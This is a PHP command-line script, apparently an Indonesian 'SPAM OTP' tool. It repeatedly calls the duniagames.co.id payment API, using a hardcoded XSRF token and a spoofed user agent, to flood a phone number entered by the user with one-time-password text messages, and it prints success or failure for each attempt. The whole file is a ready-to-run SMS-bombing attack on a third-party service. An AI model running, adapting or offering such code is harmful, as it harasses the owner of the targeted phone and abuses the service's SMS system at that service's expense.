<?php
/**
  CREATED BY ./sT0ry_mb3m :*
  DUNIAGAME.CO.ID SPAM OTP
  http://www.storymbem.indoweb.xyz/
*/
function generateID($no){
  $ch1 = curl_init();
  curl_setopt($ch1, CURLOPT_URL, "https://duniagames.co.id/api/denomination/98/generateSmsRequest");
  curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch1, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.27 Safari/537.17");
  curl_setopt($ch1, CURLOPT_HTTPHEADER, array(
  'Accept: application/json, text/plain, */*',
  'Content-Type: application/json;charset=utf-8',
  'X-XSRF-TOKEN: eyJpdiI6Imt1VHFRNyttTU9TcUVpTGVxbmdNNVE9PSIsInZhbHVlIjoiQkNHOXJuTmtZRzBPSWM0SDRSZ1ZXa2RKQ1wveW5sQ3BkY0FKUllwU2x0UDlqcHVsb0EyWHo2UUZlYmhkZDk1UlFGaFU5cDYralRDeUNzSlhEZDhtRElRPT0iLCJtYWMiOiI0YjNlMWNjZjE1YTFhYTk4NDRiNzdhZjQxMmRiZmMyODU5NGQ2YTkzZjYxMzdkN2ZlZDFlZDE0MWM5ZmU0NmYyIn0='));
  curl_setopt($ch1, CURLOPT_POSTFIELDS, '{"msisdn":"'.$no.'","username":null}');
  $ex = curl_exec($ch1);
  curl_close($ch1);
  return($ex);
}
function generateSpam($id){
  $ch1 = curl_init();
  curl_setopt($ch1, CURLOPT_URL, "https://duniagames.co.id/payment/upoint/generateKeyword?sms_request_id=$id");
  curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch1, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.27 Safari/537.17");
  curl_setopt($ch1, CURLOPT_HTTPHEADER, array(
  'Accept: application/json, text/plain, */*',
  'Content-Type: application/json;charset=utf-8',
  'X-XSRF-TOKEN: eyJpdiI6Imt1VHFRNyttTU9TcUVpTGVxbmdNNVE9PSIsInZhbHVlIjoiQkNHOXJuTmtZRzBPSWM0SDRSZ1ZXa2RKQ1wveW5sQ3BkY0FKUllwU2x0UDlqcHVsb0EyWHo2UUZlYmhkZDk1UlFGaFU5cDYralRDeUNzSlhEZDhtRElRPT0iLCJtYWMiOiI0YjNlMWNjZjE1YTFhYTk4NDRiNzdhZjQxMmRiZmMyODU5NGQ2YTkzZjYxMzdkN2ZlZDFlZDE0MWM5ZmU0NmYyIn0='));
  $ex = curl_exec($ch1);
  curl_close($ch1);
  return($ex);
}
echo "NOMER: ";
$no = trim(fgets(STDIN));
echo "JUMLAH: ";
$jm = trim(fgets(STDIN));
for ($i=1; $i <= $jm; $i++) { 
$getKiy = generateID($no);
preg_match_all("/\"id\":(.*?)}/", $getKiy, $IDs);
$spaM = generateSpam($IDs[1][0]);

if(preg_match("/silakan cek SMS pada handphone/i", $spaM)){
  echo "[ $i/$jm ] $no >> SUCCESS mBem\n";
}else{
  echo "[ $i/$jm ] $no >> FAILED mBem\n";
}
}
